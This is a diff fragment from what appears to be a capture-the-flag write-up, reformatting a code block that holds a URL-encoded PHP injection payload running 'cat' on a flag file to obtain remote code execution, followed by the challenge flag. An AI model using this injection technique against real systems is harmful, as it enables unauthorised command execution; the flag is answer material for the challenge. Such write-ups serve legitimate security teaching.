@@ -38,6 +38,6 @@ So using this payload we can get RCE
 
 Next we just need to find the flag in the nibbles directory
 
-```code=1;}system(%27cat%20./nibbles/flag.txt%27);/*```
+````code=1;}system(%27cat%20./nibbles/flag.txt%27);/*````
 
 ``` Flag : DOCTF{G3TT1NG_RC3_(S0RRY_..._N1BBL3S)_1$_4LW4Y$_GR34T}  ```
